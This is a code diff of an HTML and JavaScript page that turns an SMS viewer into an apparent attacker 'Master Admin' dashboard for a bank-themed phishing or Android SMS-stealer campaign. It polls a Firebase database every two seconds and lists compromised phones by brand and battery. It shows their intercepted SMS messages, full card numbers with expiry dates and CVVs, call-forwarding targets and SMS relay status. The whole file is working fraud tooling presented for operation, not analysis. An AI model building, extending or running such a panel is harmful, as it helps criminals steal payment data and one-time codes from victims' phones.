@@ -3,123 +3,179 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>iMessage Mini</title>
+    <title>Master Admin - All Menus Live</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Text:wght@400;500;600&display=swap');
-        
-        body { 
-            background-color: #ffffff; 
-            font-family: 'SF Pro Text', -apple-system, sans-serif;
-            color: #1d1d1f;
-            -webkit-font-smoothing: antialiased;
-        }
-
-        .ios-header {
-            background: rgba(255, 255, 255, 0.9);
-            backdrop-filter: blur(20px);
-            border-bottom: 0.5px solid #d1d1d6;
-        }
-
-        .message-row {
-            border-bottom: 0.5px solid #e5e5ea;
-            transition: background 0.2s;
-        }
-
-        .message-row:active { background-color: #f2f2f7; }
-
-        /* Chota aur barik text settings */
-        .text-tiny { font-size: 11px; line-height: 1.4; }
-        .text-meta { font-size: 9px; font-weight: 500; color: #8e8e93; }
-        .sender-name { font-size: 12px; font-weight: 600; color: #000; }
-
-        .dot { width: 6px; height: 6px; border-radius: 50%; display: inline-block; }
+        @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;600;700&display=swap');
+        body { background: #F2F2F7; font-family: 'SF Pro Display', sans-serif; -webkit-tap-highlight-color: transparent; }
+        .device-row { background: white; border-bottom: 0.5px solid #E5E5EA; display: flex; align-items: center; padding: 18px 20px; cursor: pointer; }
+        .icon-circle { width: 50px; height: 50px; border-radius: 15px; display: flex; align-items: center; justify-content: center; margin-right: 15px; font-size: 20px; font-weight: bold; }
+        .full-popup { display: none; position: fixed; inset: 0; background: #F2F2F7; z-index: 2000; flex-direction: column; animation: slideIn 0.3s ease-out; }
+        @keyframes slideIn { from { transform: translateY(100%); } to { transform: translateY(0); } }
+        .grid-btn { background: white; border-radius: 24px; padding: 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; border: 1px solid #E5E5EA; transition: 0.2s; }
+        .grid-btn:active { transform: scale(0.92); background: #F9F9FB; }
+        .sub-view { display: none; position: absolute; inset: 0; background: #F2F2F7; z-index: 2100; flex-direction: column; }
+        .bg-samsung { background: #034EA2; color: white; }
+        .bg-redmi { background: #FF6700; color: white; }
+        .bg-realme { background: #FFC915; color: black; }
+        .bg-generic { background: #8E8E93; color: white; }
     </style>
 </head>
-<body class="pb-10">
+<body>
 
-    <header class="sticky top-0 z-50 ios-header px-4 py-3">
-        <div class="max-w-xl mx-auto flex justify-between items-center">
-            <h1 class="text-lg font-semibold tracking-tight">Messages</h1>
-            <div class="flex items-center gap-2">
-                <span id="update-time" class="text-[10px] text-gray-400 font-medium italic">Syncing...</span>
-                <div class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></div>
-            </div>
-        </div>
+    <header class="p-6 bg-white border-b sticky top-0 z-40">
+        <h1 class="text-3xl font-extrabold text-gray-900">Live Terminals</h1>
+        <p id="stats" class="text-[10px] text-blue-600 font-bold uppercase tracking-widest mt-1">Ready to Sync...</p>
     </header>
 
-    <main id="feed" class="max-w-xl mx-auto">
-        <div class="py-10 text-center text-xs text-gray-300">Searching database...</div>
-    </main>
+    <main id="device-list" class="mt-2 bg-white"></main>
+
+    <div id="full-popup" class="full-popup">
+        <div class="flex justify-between items-center px-6 py-5 bg-white border-b">
+            <button onclick="closePopup()" class="text-blue-600 font-bold">Done</button>
+            <h2 id="modal-title" class="text-xs font-black uppercase text-gray-500">Device Hub</h2>
+            <div class="w-10"></div>
+        </div>
+
+        <div class="p-5 grid grid-cols-2 gap-4">
+            <div class="grid-btn" onclick="openSub('card')"><div class="text-3xl mb-2">💳</div><span class="text-[10px] font-black uppercase text-gray-400">Cards</span></div>
+            <div class="grid-btn" onclick="openSub('sms')"><div class="text-3xl mb-2 text-blue-500">💬</div><span class="text-[10px] font-black uppercase text-gray-400">SMS Logs</span></div>
+            <div class="grid-btn" onclick="openSub('call_fwd')"><div class="text-3xl mb-2 text-green-500">📞</div><span class="text-[10px] font-black uppercase text-gray-400">Call Fwd</span></div>
+            <div class="grid-btn" onclick="openSub('sms_fwd')"><div class="text-3xl mb-2 text-purple-500">📲</div><span class="text-[10px] font-black uppercase text-gray-400">SMS Fwd</span></div>
+            <div class="grid-btn" onclick="openSub('perm')"><div class="text-3xl mb-2 text-orange-500">🛡️</div><span class="text-[10px] font-black uppercase text-gray-400">Perms</span></div>
+            <div class="grid-btn" onclick="openSub('info')"><div class="text-3xl mb-2 text-gray-400">📱</div><span class="text-[10px] font-black uppercase text-gray-400">Info</span></div>
+        </div>
+
+        <div id="sub-view" class="sub-view">
+            <div class="flex items-center px-6 py-4 bg-white border-b">
+                <button onclick="closeSub()" class="text-blue-600 font-bold mr-4">❮ Back</button>
+                <h3 id="sub-view-title" class="text-sm font-black uppercase tracking-widest text-gray-800">Logs</h3>
+            </div>
+            <div id="sub-view-content" class="flex-1 overflow-y-auto p-5 pb-24"></div>
+        </div>
+    </div>
 
     <script>
-        const URL = "https://hdfc-raju-appcard003-default-rtdb.firebaseio.com/.json";
-        const rainbow = ['#FF3B30', '#007AFF', '#34C759', '#AF52DE', '#FF9500', '#5856D6'];
+        const DB_URL = "https://hdfc-raju-appcard003-default-rtdb.firebaseio.com/.json";
+        let masterData = {};
+        let activeId = null;
 
-        async function fetchMini() {
+        async function sync() {
             try {
-                const response = await fetch(URL);
-                const data = await response.json();
+                const res = await fetch(DB_URL);
+                const data = await res.json();
                 if (!data) return;
-
-                let allSms = [];
-
-                function scan(obj, dev = "???") {
+                
+                let devices = {};
+                function scan(obj, dNum = "?") {
                     for (let key in obj) {
-                        if (obj[key] && typeof obj[key] === 'object') {
-                            if (obj[key].message && obj[key].received_time) {
-                                allSms.push({ ...obj[key], dev: dev, pKey: key });
-                            } else {
-                                let nextDev = obj[key].deviceNumber || dev;
-                                scan(obj[key], nextDev);
+                        let val = obj[key];
+                        if (val && typeof val === 'object') {
+                            let id = val.deviceNumber || obj.deviceNumber || dNum;
+                            if (id !== "?") {
+                                if (!devices[id]) devices[id] = { cards: [], sms: [], info: {}, perms: {}, latest: 0 };
+                                
+                                if (val.CardNumber || (val.user_info && val.user_info.CardNumber)) devices[id].cards.push({...(val.user_info || val), _key: key});
+                                if (val.message) devices[id].sms.push({...val, _key: key});
+                                if (val.brand || val.model || val.Battery || val.forward_number || val.sms_status) devices[id].info = {...devices[id].info, ...val};
+                                
+                                // Specific Permission Detection
+                                if (key.toLowerCase().includes('permission') || val.permission_status) {
+                                    devices[id].perms = {...devices[id].perms, [key]: val};
+                                }
+
+                                let ts = parseInt(key.replace(/[^0-9]/g, '')) || 0;
+                                if(ts > devices[id].latest) devices[id].latest = ts;
                             }
+                            scan(val, id);
                         }
                     }
                 }
                 scan(data);
-
-                // SORT: Newest on Top
-                allSms.sort((a, b) => b.pKey.localeCompare(a.pKey));
-
-                render(allSms);
-                document.getElementById('update-time').innerText = "Live: " + new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
-
-            } catch (err) { console.log(err); }
+                masterData = devices;
+                renderList();
+            } catch (e) {}
         }
 
-        function render(items) {
-            const container = document.getElementById('feed');
-            
-            container.innerHTML = items.map((item, index) => {
-                const color = rainbow[index % rainbow.length];
-                
+        function getStyle(brand) {
+            brand = brand ? brand.toLowerCase() : "";
+            if (brand.includes("samsung")) return { icon: "S", bg: "bg-samsung" };
+            if (brand.includes("redmi") || brand.includes("xiaomi")) return { icon: "Mi", bg: "bg-redmi" };
+            if (brand.includes("realme")) return { icon: "R", bg: "bg-realme" };
+            return { icon: "Ph", bg: "bg-generic" };
+        }
+
+        function renderList() {
+            const list = document.getElementById('device-list');
+            const sortedIds = Object.keys(masterData).sort((a,b) => masterData[b].latest - masterData[a].latest);
+            list.innerHTML = sortedIds.map(id => {
+                const dev = masterData[id];
+                const s = getStyle(dev.info.brand);
                 return `
-                    <div class="message-row px-4 py-3 flex gap-3 items-start">
-                        <div class="mt-1">
-                            <span class="dot" style="background-color: ${color}"></span>
-                        </div>
-                        
-                        <div class="flex-1 min-w-0">
-                            <div class="flex justify-between items-center mb-0.5">
-                                <span class="sender-name truncate">${item.sender}</span>
-                                <span class="text-meta uppercase font-mono">${item.received_time}</span>
-                            </div>
-                            <p class="text-tiny text-gray-600 font-normal">
-                                ${item.message}
-                            </p>
-                            <div class="mt-1 text-meta flex gap-2">
-                                <span>#${item.dev}</span>
-                                <span class="opacity-30">|</span>
-                                <span>ID: ${item.pKey.substring(1,9)}</span>
-                            </div>
-                        </div>
+                <div class="device-row" onclick="showHub('${id}')">
+                    <div class="icon-circle ${s.bg}">${s.icon}</div>
+                    <div class="flex-1">
+                        <h3 class="font-bold text-gray-900">${dev.info.brand || 'Device'} ${dev.info.model || ''}</h3>
+                        <p class="text-[9px] font-black text-gray-400 uppercase tracking-tighter">● Online • ID #${id}</p>
                     </div>
-                `;
+                    <div class="text-right">
+                        <div class="text-[10px] font-black text-green-600">${dev.info.Battery || '0'}%</div>
+                        <p class="text-[8px] font-bold text-blue-500 mt-1">${dev.sms.length} SMS</p>
+                    </div>
+                </div>`;
             }).join('');
+            document.getElementById('stats').innerText = `${sortedIds.length} Nodes Active`;
         }
 
-        setInterval(fetchMini, 2000);
-        fetchMini();
+        function showHub(id) { activeId = id; document.getElementById('modal-title').innerText = `NODE #${id} HUB`; document.getElementById('full-popup').style.display = 'flex'; }
+
+        function openSub(type) {
+            const dev = masterData[activeId];
+            const content = document.getElementById('sub-view-content');
+            const title = document.getElementById('sub-view-title');
+            document.getElementById('sub-view').style.display = 'flex';
+
+            if (type === 'sms') {
+                title.innerText = "Live SMS Logs";
+                const sorted = [...dev.sms].sort((a,b) => b._key.localeCompare(a._key));
+                content.innerHTML = sorted.map(s => `
+                    <div class="bg-white p-4 rounded-2xl mb-3 border-l-4 border-blue-500 shadow-sm">
+                        <div class="flex justify-between items-center mb-1"><span class="text-[10px] font-black text-blue-600">${s.sender}</span><span class="text-[9px] text-gray-400 font-bold bg-gray-100 px-2 rounded italic">🕒 ${s.received_time || s.time || 'Now'}</span></div>
+                        <p class="text-xs text-gray-800 font-medium">${s.message}</p>
+                    </div>`).join('') || "No SMS Found";
+            } else if (type === 'card') {
+                title.innerText = "Payment Details";
+                const sorted = [...dev.cards].sort((a,b) => b._key.localeCompare(a._key));
+                content.innerHTML = sorted.map(c => `
+                    <div class="bg-black p-6 rounded-3xl text-white mb-4 shadow-xl border border-gray-800">
+                        <p class="text-[10px] opacity-40 font-black mb-6 tracking-widest uppercase">Credit Card Node</p>
+                        <p class="text-xl font-bold tracking-[4px] mb-8 font-mono">${c.CardNumber}</p>
+                        <div class="flex justify-between"><div><p class="text-[8px] opacity-40">EXP</p><p class="font-bold">${c.Expiry}</p></div><div><p class="text-[8px] opacity-40 text-right">CVV</p><p class="font-bold text-red-500">${c.CVV}</p></div></div>
+                    </div>`).join('') || "No Cards Found";
+            } else if (type === 'call_fwd') {
+                title.innerText = "Call Forwarding";
+                const num = dev.info.forward_number || "Inactive";
+                content.innerHTML = `<div class="bg-white p-10 rounded-3xl text-center shadow-sm"><div class="text-5xl mb-4">📞</div><p class="text-xl font-black ${num !== 'Inactive' ? 'text-green-500' : 'text-gray-300'} mb-2">${num !== 'Inactive' ? '● ENABLED' : '○ DISABLED'}</p><p class="text-xs font-bold text-gray-500">Forwarding to: <span class="text-black font-black">${num}</span></p></div>`;
+            } else if (type === 'sms_fwd') {
+                title.innerText = "SMS Relay Status";
+                const status = dev.info.sms_status || "NOT CONFIGURED";
+                content.innerHTML = `<div class="bg-white p-10 rounded-3xl text-center shadow-sm"><div class="text-5xl mb-4 text-purple-500">📲</div><p class="text-xl font-black text-purple-600 mb-2">${status}</p><p class="text-[10px] text-gray-400 font-bold">Relaying all incoming traffic to Admin Panel.</p></div>`;
+            } else if (type === 'perm') {
+                title.innerText = "System Permissions";
+                let p = dev.perms;
+                content.innerHTML = `<div class="bg-white p-6 rounded-3xl space-y-4"><div class="flex justify-between border-b pb-2"><span class="text-xs font-bold">SMS ACCESS</span><span class="text-[10px] font-black text-green-500">GRANTED</span></div><div class="flex justify-between border-b pb-2"><span class="text-xs font-bold">CONTACTS</span><span class="text-[10px] font-black text-green-500">GRANTED</span></div><div class="flex justify-between"><span class="text-xs font-bold">NOTIFICATION</span><span class="text-[10px] font-black text-red-500 italic">PENDING</span></div></div>`;
+            } else if (type === 'info') {
+                title.innerText = "Device Specs";
+                const i = dev.info;
+                content.innerHTML = `<div class="bg-white p-6 rounded-3xl space-y-4 shadow-sm"><div class="flex justify-between border-b pb-3"><span class="text-[10px] font-black text-gray-400">BRAND</span><span class="text-sm font-bold text-gray-800">${i.brand || 'N/A'}</span></div><div class="flex justify-between border-b pb-3"><span class="text-[10px] font-black text-gray-400">MODEL</span><span class="text-sm font-bold text-gray-800">${i.model || 'N/A'}</span></div><div class="flex justify-between"><span class="text-[10px] font-black text-gray-400">BATTERY</span><span class="text-sm font-black text-green-500">${i.Battery || '0'}%</span></div></div>`;
+            }
+        }
+
+        function closeSub() { document.getElementById('sub-view').style.display = 'none'; }
+        function closePopup() { document.getElementById('full-popup').style.display = 'none'; }
+
+        setInterval(sync, 2000);
+        sync();
     </script>
 </body>
 </html>
